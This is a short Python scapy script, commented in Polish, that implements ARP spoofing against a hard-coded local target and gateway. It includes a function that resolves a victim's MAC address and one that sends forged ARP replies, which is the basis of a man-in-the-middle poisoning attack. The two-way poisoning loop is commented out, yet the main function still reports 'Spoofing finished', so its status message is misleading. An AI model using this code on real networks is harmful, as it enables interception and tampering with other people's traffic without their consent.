from scapy.all import *

# skrypt spoofingu- wyłuskanie MAC adresu naszego targetu bez wpisywania naszego adresu w jego tablicę (przekłamanie)
# wymagane protokoły: Ethernet i ARP reszta dowolnie
# wymagany docelowy adres IP i adres IP gatewaya
from scapy.layers.l2 import Ether, ARP

targetip = '192.168.1.164'  # wpisz jakiś swój ip adres, który istnieje
gatewayip = '192.168.1.1'


def getMACAddress(targetip):
    arppacket = Ether(dst='ff:ff:ff:ff:ff:ff') /ARP(op=1, pdst=targetip)
    targetMAC = srp(arppacket, timeout=1, verbose=False)[0]
    return targetMAC[0][1].hwsrc


def sendspoofedreply(targetip, targetmac, sourceip): # wysyłamy odpowiedzi ze złym source ip- spoofing
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)

def main_function(targetIP, gatewayIP):
    # targetMAC = getMACAddress(targetip)

    # gatewayMAC = getMACAddress(gatewayip)


    # # spoofing
    # try:
    #     for i in range(100):
    #         sendspoofedreply(targetip, targetMAC, gatewayip)
    #         sendspoofedreply(gatewayip, gatewayMAC, targetip)
    # except KeyboardInterrupt:
    #     print('Stop spoofing')
    # return 'Spoofing done-> \nTarget MAC: ', targetMAC, ' \n Gateway MAC: ', gatewayMAC
    return 'Spoofing finished; targetIP: ' + targetIP + ' gatewayIP:' + gatewayIP 
